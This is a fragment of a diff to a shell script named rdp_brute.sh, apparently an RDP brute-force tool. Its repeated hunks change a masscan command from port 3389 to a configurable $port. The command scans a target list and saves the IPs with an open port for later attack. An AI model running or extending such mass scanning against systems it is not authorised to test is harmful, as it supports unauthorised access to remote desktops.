 CHECKFILEEN
 
 
@@ -19361,7 +19365,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19407,7 +19411,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19453,7 +19457,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19499,7 +19503,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19545,7 +19549,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19591,7 +19595,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19637,7 +19641,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19682,7 +19686,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19727,7 +19731,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19773,7 +19777,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19818,7 +19822,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19863,7 +19867,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19908,7 +19912,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19953,7 +19957,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19998,7 +20002,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -20044,7 +20048,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -20089,7 +20093,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -20135,7 +20139,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -20181,7 +20185,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -20219,7 +20223,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
